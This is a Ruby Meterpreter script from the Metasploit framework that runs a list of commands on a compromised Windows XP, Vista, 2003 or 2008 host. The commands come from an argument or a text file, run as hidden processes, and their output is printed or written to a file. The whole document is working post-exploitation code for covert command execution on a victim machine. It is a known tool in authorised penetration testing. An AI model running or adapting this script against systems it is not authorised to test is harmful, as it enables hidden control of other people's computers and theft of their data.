#Meterpreter script for running multiple commands on Windows 2003, Windows Vista
# and Windows XP and Windows 2008 targets.
#Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
#Verion: 0.1
################## Variable Declarations ##################
session = client
wininfo = client.sys.config.sysinfo
# Setting Arguments
@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false,"Help menu."                        ],
  "-cl" => [ true,"Commands to execute. The command must be enclosed in double quotes and separated by a comma."],
  "-f" => [ true,"File where to saved output of command."],
  "-rc" => [ true,"Text file with list of commands, one per line."]
)
#Setting Argument variables
commands = []
script = nil
outfile = nil
help = 0

################## Function Declarations ##################
# Function for running a list of commands stored in a array, returs string
def list_exec(session,cmdlst)
  print_status("Running Command List ...")
  tmpout = ""
  cmdout = ""
  r=''
  session.response_timeout=120
  cmdlst.each do |cmd|
    next if cmd.strip.length < 1
    next if cmd[0,1] == "#"
    begin
      print_status "\trunning command #{cmd}"
      tmpout = "\n"
      tmpout << "*****************************************\n"
      tmpout << "      Output of #{cmd}\n"
      tmpout << "*****************************************\n"
      r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
      while(d = r.channel.read)
        tmpout << d
        break if d == ""
      end
      cmdout << tmpout
      r.channel.close
      #r.close
    rescue ::Exception => e
      print_status("Error Running Command #{cmd}: #{e.class} #{e}")
    end
  end
  cmdout
end
# Function for writing results of other functions to a file
def filewrt(file2wrt, data2wrt)
  output = ::File.open(file2wrt, "a")
  data2wrt.each_line do |d|
    output.puts(d)
  end
  output.close
end

def usage
  print_line("Windows Multi Command Execution Meterpreter Script ")
  print_line(@@exec_opts.usage)
  raise Rex::Script::Completed

end

################## Main ##################
@@exec_opts.parse(args) { |opt, idx, val|
  case opt

  when "-cl"
    commands = val.split(",")
  when "-rc"
    script = val
    if not ::File.exists?(script)
      raise "Command List File does not exists!"
    else
      ::File.open(script, "r").each_line do |line|
        commands << line.chomp
      end
    end
  when "-f"
    outfile = val
  when "-h"
    help = 1
  end
}

if args.length == 0 or help == 1
  usage
elsif commands or script
  if outfile
    filewrt(outfile, list_exec(session,commands))
  else
    list_exec(session,commands).each_line do |l|
      print_status(l.chomp)
    end
  end
  raise Rex::Script::Completed
else
  usage
end
